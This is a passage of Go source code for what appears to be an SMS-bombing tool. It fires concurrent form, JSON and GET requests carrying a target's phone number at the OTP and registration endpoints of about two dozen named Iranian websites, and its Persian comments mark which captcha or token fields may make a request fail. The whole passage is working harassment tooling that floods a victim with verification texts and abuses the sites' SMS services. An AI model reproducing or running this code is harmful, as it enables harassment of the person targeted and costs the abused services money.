			formData.Set("action", "send_verification_code")
			formData.Set("phone_number", phone)
			sendFormRequest(ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// 7. moshaveran724.ir/m/pms.php (Form POST)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone)
			formData.Set("cache", "false")
			sendFormRequest(ctx, "https://moshaveran724.ir/m/pms.php", formData, &wg, ch)
		}

		// 8. moshaveran724.ir/m/uservalidate.php (Form POST)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone)
			formData.Set("cache", "false")
			sendFormRequest(ctx, "https://moshaveran724.ir/m/uservalidate.php", formData, &wg, ch)
		}

		// 9. behzadshami.com/login_register (Form POST)
		// نیاز به کپچا و Nonce - ممکن است ناموفق باشد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("type", "register")
			formData.Set("regName", "placeholder") // فیلد placeholder
			formData.Set("mobits_country", "98")
			formData.Set("regMobile", phone)
			formData.Set("g-recaptcha-response", "") // نیاز به حل کپچا دارد
			formData.Set("dlr-register", "ثبت نام")
			formData.Set("_dlr_mobits", "register")
			formData.Set("dlr_nonce", "placeholder") // ممکن است پویا باشد
			sendFormRequest(ctx, "https://behzadshami.com/login_register?type=register", formData, &wg, ch)
		}

		// 10. mihanpezeshk.com/ConfirmCodeSbm_Doctor (Form POST)
		// نیاز به Token و Recaptcha - ممکن است ناموفق باشد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("_token", "placeholder") // ممکن است پویا باشد
			formData.Set("recaptcha", "") // نیاز به حل کپچا دارد
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://www.mihanpezeshk.com/ConfirmCodeSbm_Doctor", formData, &wg, ch)
		}

		// 11. mihanpezeshk.com/Verification_Patients (Form POST)
		// نیاز به Token و Recaptcha - ممکن است ناموفق باشد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("_token", "placeholder") // ممکن است پویا باشد
			formData.Set("recaptcha", "") // نیاز به حل کپچا دارد
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://www.mihanpezeshk.com/Verification_Patients", formData, &wg, ch)
		}

		// 12. my.limoome.com/api/auth/login/otp (Form POST)
		// نیاز به Recaptcha - ممکن است ناموفق باشد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobileNumber", strings.TrimPrefix(phone, "0")) // در نمونه ارسالی بدون 0 است
			formData.Set("country", "1")
			formData.Set("recaptchaToken", "") // نیاز به حل کپچا دارد
			sendFormRequest(ctx, "https://my.limoome.com/api/auth/login/otp", formData, &wg, ch)
		}

		// 13. simkhanapi.ir/api/users/registerV2 (JSON POST)
		// نیاز به Key - ممکن است پویا باشد
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
				"mobileNumber": phone,
				"key":          "placeholder", // ممکن است پویا باشد
				"ReSendSMS":    false,
			}, &wg, ch)
		}

		// 14. see5.net/wp-content/themes/see5/webservice_demo2.php (Form POST)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			formData.Set("name", "placeholder") // فیلد نام
			formData.Set("demo", "bz_sh_fzltprxh") // مقدار ثابت در نمونه
			sendFormRequest(ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
		}

		// 15. pakhsh.shop/wp-admin/admin-ajax.php (Form POST) - نوع sms_otp
		// نیاز به فیلدهای متعدد و ممکن است پویا باشند - نیاز به کپچا دارد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", phone)
			formData.Set("digits_reg_name", "placeholder") // فیلد placeholder
			formData.Set("digits_process_register", "1")
			formData.Set("sms_otp", "")
			formData.Set("otp_step_1", "1")
			formData.Set("signup_otp_mode", "1")
			formData.Set("instance_id", "7b9c803771fd7a82bf8f0f5a673f1a3d") // ممکن است پویا باشد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "") // فیلد کپچا؟
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F") // ممکن است پویا باشد
			formData.Set("digits_form", "63fd8a495f") // ممکن است پویا باشد
			formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F") // ممکن است پویا باشد
			formData.Set("container", "digits_protected")
			formData.Set("sub_action", "sms_otp")
			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// 16. api.doctoreto.com/api/web/patient/v1/accounts/register (JSON POST)
		// نیاز به کپچا - ممکن است ناموفق باشد
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
				"mobile":     strings.TrimPrefix(phone, "0"), // در نمونه ارسالی بدون 0 است
				"country_id": 205,
				"captcha":    "", // نیاز به حل کپچا دارد
			}, &wg, ch)
		}

		// 17. tagmond.com/phone_number (Form POST)
		// درخواست اول که کپچا ندارد را اضافه میکنیم
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("utf8", "✓")
			formData.Set("custom_comment_body_hp_24124", "")
			formData.Set("phone_number", phone)
			sendFormRequest(ctx, "https://tagmond.com/phone_number", formData, &wg, ch)
		}

		// 18. platform-api.snapptrip.com/profile/auth/request-otp (JSON POST)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// 19. auth.mrbilit.ir/api/Token/send?mobile=... (GET)
		wg.Add(1)
		tasks <- func() {
			// برای درخواست GET، شماره تلفن در URL قرار میگیرد
			sendGETRequest(ctx, fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=%s", phone), &wg, ch)
		}

		// 20. backend.digify.shop/user/merchant/otp/ (JSON POST)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://backend.digify.shop/user/merchant/otp/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// 21. api.watchonline.shop/api/v1/otp/request (JSON POST)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// 22. glite.ir/wp-admin/admin-ajax.php (Form POST)
		// نیاز به Security Token و ممکن است کپچا - ممکن است ناموفق باشد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "mreeir_send_sms")
			formData.Set("mobileemail", phone)
			formData.Set("userisnotauser", "")
			formData.Set("type", "mobile")
			formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
			formData.Set("captchahash", "") // ممکن است پویا باشد
			formData.Set("security", "placeholder") // ممکن است پویا باشد
			sendFormRequest(ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// 23. mamifood.org/Registration.aspx/SendValidationCode (JSON POST)
		// نیاز به Device ID (did) - ممکن است پویا باشد
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
				"Phone": phone,
				"did":   "placeholder", // ممکن است پویا باشد
			}, &wg, ch)
		}

		// 24. refahtea.ir/wp-admin/admin-ajax.php (Form POST)
		// نیاز به Security Token - ممکن است پویا باشد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "refah_send_code")
			formData.Set("mobile", phone)
			formData.Set("security", "placeholder") // ممکن است پویا باشد
			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// --------------------------------------------------
		// APIهایی که به دلایل ذکر شده اضافه نشدند:
		// - core.gap.im: فرمت Payload نامشخص (غیر استاندارد JSON یا Form)
		// - api.bitpin.org/v3/usr/authenticate: به نظر می رسد EndPoint لاگین باشد (نیاز به رمز عبور)
		// - offch.com/login: به نظر می رسد EndPoint لاگین باشد (فرم ارسال اطلاعات ورود)
		// --------------------------------------------------

	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش کدهای وضعیت
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
